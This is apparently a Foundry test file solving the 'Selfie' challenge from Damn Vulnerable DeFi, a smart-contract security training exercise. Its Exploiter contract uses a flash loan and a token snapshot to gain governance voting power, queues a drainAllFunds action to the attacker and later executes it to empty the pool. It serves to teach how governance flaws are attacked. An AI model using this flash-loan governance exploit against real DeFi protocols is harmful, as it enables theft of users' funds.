// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableTokenSnapshot} from "../../../src/Contracts/DamnValuableTokenSnapshot.sol";
import {SimpleGovernance} from "../../../src/Contracts/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../../src/Contracts/selfie/SelfiePool.sol";

contract Selfie is Test {
    uint256 internal constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 internal constant TOKENS_IN_POOL = 1_500_000e18;

    Utilities internal utils;
    SimpleGovernance internal simpleGovernance;
    SelfiePool internal selfiePool;
    DamnValuableTokenSnapshot internal dvtSnapshot;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];

        vm.label(attacker, "Attacker");

        dvtSnapshot = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        vm.label(address(dvtSnapshot), "DVT");

        simpleGovernance = new SimpleGovernance(address(dvtSnapshot));
        vm.label(address(simpleGovernance), "Simple Governance");

        selfiePool = new SelfiePool(
            address(dvtSnapshot),
            address(simpleGovernance)
        );

        dvtSnapshot.transfer(address(selfiePool), TOKENS_IN_POOL);

        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        vm.startPrank(attacker);
        Exploiter exploiter = new Exploiter(simpleGovernance, selfiePool, dvtSnapshot);
        exploiter.exploit(TOKENS_IN_POOL);
        vm.warp(block.timestamp + simpleGovernance.getActionDelay());
        exploiter.drainAllFunds();
        vm.stopPrank();
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvtSnapshot.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(dvtSnapshot.balanceOf(address(selfiePool)), 0);
    }
}

contract Exploiter {
    uint256 actionId;

    SimpleGovernance private immutable simpleGovernance;
    SelfiePool private immutable selfiePool;
    DamnValuableTokenSnapshot private immutable dvtSnapshot;
    address private immutable owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner"); // Avoid searcher front-running
        _;
    }

    constructor(SimpleGovernance _simpleGovernance, SelfiePool _selfiePool, DamnValuableTokenSnapshot _dvtSnapshot) {
        simpleGovernance = _simpleGovernance;
        selfiePool = _selfiePool;
        dvtSnapshot = _dvtSnapshot;
        owner = msg.sender;
    }

    function exploit(uint256 _borrow) external onlyOwner {
        selfiePool.flashLoan(_borrow);
    }

    function receiveTokens(address _token, uint256 _borrowed) external {
        dvtSnapshot.snapshot();
        actionId = simpleGovernance.queueAction(
            address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0
        );
        dvtSnapshot.transfer(address(selfiePool), _borrowed);
    }

    function drainAllFunds() external onlyOwner {
        simpleGovernance.executeAction(actionId);
    }
}
